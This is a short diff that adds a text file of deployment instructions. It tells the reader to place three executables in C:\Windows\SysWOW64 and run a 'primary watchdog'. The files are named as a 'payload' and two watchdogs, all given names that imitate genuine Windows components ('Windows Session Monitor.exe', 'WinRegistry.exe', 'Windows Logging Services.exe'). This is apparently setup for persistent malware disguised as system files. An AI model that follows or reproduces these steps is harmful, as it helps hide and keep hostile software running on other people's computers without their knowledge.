@@ -1,0 +1,8 @@
+C:\Windows\SysWOW64\
+
+
+^^PUT ALL THREE FILES IN ABOVE FILEPATH THEN RUN PRIMARY WATCHDOG^^
+
+Payload Name: Windows Session Monitor.exe
+Primary Watchdog Name: WinRegistry.exe
+Secondary Watchdog Name: Windows Logging Services.exe
